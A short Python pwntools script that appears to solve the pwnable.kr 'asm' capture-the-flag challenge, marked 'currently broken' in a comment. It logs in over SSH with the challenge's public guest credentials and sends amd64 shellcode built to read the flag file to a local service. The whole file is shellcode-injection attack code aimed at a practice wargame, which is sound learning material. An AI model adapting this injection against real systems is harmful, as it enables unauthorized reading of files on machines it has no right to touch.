from pwn import *
# currently broken
flag_file = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'
shellcode = asm(shellcraft.amd64.readfile(flag_file), arch='amd64')
print(shellcode)
s = ssh(host='pwnable.kr',port=2222,user='asm',password='guest')
r = s.remote('localhost', 9026)
r.sendline(shellcode)
r.interactive()

